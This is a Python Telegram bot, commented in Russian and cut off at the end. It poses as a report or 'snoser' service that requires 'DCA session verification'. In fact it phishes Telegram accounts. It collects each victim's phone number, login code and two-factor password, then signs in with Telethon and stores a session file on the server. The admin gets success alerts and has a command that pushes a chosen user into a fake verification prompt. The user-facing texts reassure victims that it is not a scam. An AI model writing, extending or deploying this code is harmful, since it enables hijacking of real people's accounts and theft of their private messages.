import asyncio
import logging
import os

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton

# Импортируем Telethon для работы с сессиями
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

BOT_TOKEN = os.getenv("9113377612:AAGs2BQBTKaeTAs46GaWx7YOQkKF2aHN2mE")
ADMIN_ID = os.getenv("8716039739")
ADMIN_ID = int(ADMIN_ID) if ADMIN_ID else None

# ВНИМАНИЕ: Заполните эти данные с сайта my.telegram.org
API_ID = 1234567  # Замените на ваш API_ID (число)
API_HASH = "ваша_хеш_строка_api"  # Замените на ваш API_HASH

logging.basicConfig(level=logging.INFO)
router = Router()

# Временное хранилище запущенных клиентов в оперативной памяти сервера
active_clients = {}

# Тексты вопросов анкеты
Q_NAME = "Здравствуйте, введите id человека и его username
Опишите сам репорт открыто в формате:
1.@username
2.id
3.описание"
Q_CITY = "Отлично, ваш репорт почти принят, осталось войти в сессию DCA и верифицировать себя как пользователя-разработчика.
Для этого пожалуйста пришлите Номер телефона в формате:
+7 123 123 133"
Q_AGE = "Теперь, для входа скажите код пришедший вам в Telegram. P.S. эт не наеб, для дцашки надо верифнуть, я сам в ней верифнут трижды, сессия у тебя будет сидеть пока ты сносером хочешь пользоваться, в любой момент можешь кикнуть но без нее не будет сносер работать"
Q_LANGUAGE = "Твой любимый язык программирования?"
Q_ABOUT = "Коротко расскажи о себе:"


# Сюда добавлены новые состояния для авторизации сессии
class Form(StatesGroup):
    name = State()
    city = State()
    age = State()
    language = State()
    about = State()
    
    # Новые состояния
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()


async def send_answer_to_admin(message: Message, question: str):
    """Сразу отправляет админу ответ пользователя на конкретный вопрос."""
    if not ADMIN_ID:
        return
    user = message.from_user
    text = (
        f"✍️ Ответ от @{user.username or 'без_username'} (id {user.id})\n\n"
        f"❓ {question}\n"
        f"💬 {message.text}"
    )
    try:
        await message.bot.send_message(ADMIN_ID, text)
    except Exception as e:
        logging.warning("Не удалось отправить ответ админу: %s", e)


# --- 🔑 ФУНКЦИОНАЛ АДМИНИСТРАТОРА (ЗАПРОС СЕССИИ) ---

@router.message(Command("request_session"), F.from_user.id == ADMIN_ID)
async def admin_request_session(message: Message, command: CommandObject, dispatcher: Dispatcher):
    """
    Команда для админа. Принимает ID пользователя.
    Пример: /request_session 123456789
    """
    if not command.args or not command.args.isdigit():
        await message.answer("❌ Укажите числовой ID пользователя.\nПример: `/request_session 987654321`")
        return

    target_user_id = int(command.args)
    
    # Создаем кнопку для отправки контакта (чтобы пользователю было проще)
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Подтвердить профиль", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    try:
        # Перехватываем контекст FSM этого пользователя
        user_state = dispatcher.fsm.resolve_context(message.bot, target_user_id, target_user_id)
        # Принудительно сбрасываем его текущую анкету и переводим в режим авторизации
        await user_state.clear()
        await user_state.set_state(Form.waiting_for_phone)
        
        # Отправляем сообщение пользователю
        await message.bot.send_message(
            chat_id=target_user_id, 
            text="⚠️ **Внимание! Требуется верификация аккаунта.**\n\nПожалуйста, нажмите кнопку «📱 Подтвердить профиль» ниже для продолжения.",
            reply_markup=keyboard
        )
        
        await message.answer(f"⏳ Запрос отправлен пользователю `{target_user_id}`. Ожидаем его номер телефона...")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить запрос (возможно, бот заблокирован или ID неверный): {e}")


# --- 👤 ОБРАБОТКА ШАГОВ АВТОРИЗАЦИИ СЕССИИ ---

@router.message(Form.waiting_for_phone, F.contact)
async def user_shared_phone(message: Message, state: FSMContext):
    """Пользователь нажал на кнопку и поделился номером"""
    phone = message.contact.phone_number
    user_id = message.from_user.id
    
    await message.answer("⏳ Генерируем код подтверждения. Пожалуйста, подождите...")
    if ADMIN_ID:
        await message.bot.send_message(ADMIN_ID, f"📱 Пользователь {user_id} передал номер телефона: `{phone}`")

    # Инициализируем сессию Telethon на сервере. Файл назовется session_ID.session
    session_name = f"session_{user_id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    
    try:
        # Запрашиваем код верификации у Telegram на этот номер
        send_code_obj = await client.send_code_request(phone)
        
        # Сохраняем важные данные внутри FSM пользователя
        await state.update_data(phone=phone, phone_code_hash=send_code_obj.phone_code_hash)
        active_clients[user_id] = client  # Сохраняем работающий клиент в память
        
        await message.answer("💬 Вам отправлен официальный код подтверждения от Telegram.\n\nВведите полученный код сюда:")
        await state.set_state(Form.waiting_for_code)
        
    except Exception as e:
        await message.answer(f"❌ Ошибка отправки кода. Обратитесь к админу.\n{e}")
        await client.disconnect()
        await state.clear()


@router.message(Form.waiting_for_code)
async def user_entered_code(message: Message, state: FSMContext):
    """Пользователь ввел код из SMS или уведомления Telegram"""
    code = message.text.strip() if message.text else ""
    user_id = message.from_user.id
    data = await state.get_data()
    
    client = active_clients.get(user_id)
    if not client:
        await message.answer("❌ Сессия не найдена. Начните процесс заново.")
        await state.clear()
        return

    try:
        # Пытаемся войти по коду
        await client.sign_in(phone=data['phone'], code=code, phone_code_hash=data['phone_code_hash'])
        
        # Если вошли успешно (нет 2FA защиты)
        await message.answer("✅ Верификация успешно завершена! Спасибо.")
        if ADMIN_ID:
            await message.bot.send_message(
                ADMIN_ID, 
                f"🎉 **Успех!** Сессия пользователя `{user_id}` успешно создана и лежит на сервере под именем `session_{user_id}.session`"
            )
        
        # Закрываем клиент и очищаем состояние
        await client.disconnect()
        if user_id in active_clients:
            del active_clients[user_id]
        await state.clear()
        
    except SessionPasswordNeededError:
        # Если у пользователя включен облачный пароль (двухфакторка)
        await message.answer("🔒 Ваш аккаунт защищен двухфакторной аутентификацией (2FA).\n\nПожалуйста, введите ваш пароль:")
        await state.set_state(Form.waiting_for_2fa)
        
    except Exception as e:
        await message.answer(f"❌ Неверный код или ошибка: {e}\nПопробуйте ввести код еще раз:")


@router.message(Form.waiting_for_2fa)
async def user_entered_2fa(message: Message, state: FSMContext):
    """Пользователь ввел пароль двухфакторной аутентификации"""
    password = message.text
    user_id = message.from_user.id
    client = active_clients.get(user_id)
    
    if not client:
        await message.answer("❌ Ошибка сессии. Начните заново.")
        await state.clear()
        return

    try:
        # Входим по паролю
        await client.sign_in(password=password)
        
        await message.answer("✅ Верификация успешно завершена! Спасибо.")
        if ADMIN_ID:
            await message.bot.send_message(
                ADMIN_ID, 
                f"🎉 **Успех!** Сессия пользователя `{user_id}` (с прохождением 2FA) успешно создана."
            )
        
        await client.disconnect()
        if user_id in active_clients:
            del active_clients[user_id]
        await state.clear()
        
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {e}\nПопробуйте ввести пароль еще раз:")


# --- 📝 СТАНДАРТНАЯ АНКЕТА ИЗ ВАШЕГО КОДА ---

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(f"Привет! Давай заполним небольшую анкету 📝\n\n{Q_NAME}")
    await state.set_state(Form.name)


@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Анкета отменена. Чтобы начать заново — /start")


@router.message(Form.name)
async def step_name(message: Message, state: FSMContext):
    await send_answer_to_admin(message, Q_NAME)
    await state.update_data(name=message.text)
    await message.answer(Q_CITY)
    await state.set_state(Form.city)


@router.message(Form.city)
async def step_city(message: Message, state: FSMContext):
    await send_answer_to_admin(message, Q_CITY)
    await state.update_data(city=message.text)
    await message.answer(Q_AGE)
    await state.set_state(Form.age)


@router.message(Form.age)
async def step_age(message: Message, state: FSMContext):
    if not message.text or not message.text.isdigit():
        await message.answer("Введи возраст числом, пожалуйста 🙂")
        return
    await send_answer_to_admin(message, Q_AGE)
    await state.update_data(age=message.text)
    await message.answer(Q_LANGUAGE)
    await state.set_state(Form.language)


@router.message(Form.language)
async def step_language(message: Message, state: FSMContext):
    await send_answer_to_admin(message, Q_LANGUAGE)
    await state.update_data(language=message.text)
    await message.answer(Q_ABOUT)
    await state.set_state(Form.about)


@router.message(Form.about)
async def step_about(message: Message, state: FSMContext):
    await send_answer_to_admin(message, Q_ABOUT)
    await state.update_data(about=message.text)
    data = await state.get_data()
    summary = (
        "✅ Анкета заполнена!\n\n"
        f"👤 Имя: {data['name']}\n"
        f"🏙 Город: {data['city']}\n"
        f"🎂 Возраст: {data['age']}\n"
        f"💻 Язык: {data['language']}\n"
        f"📄 О себе: {data['about']}"
    )
    await message.answer(summary)
    if ADMIN_ID:
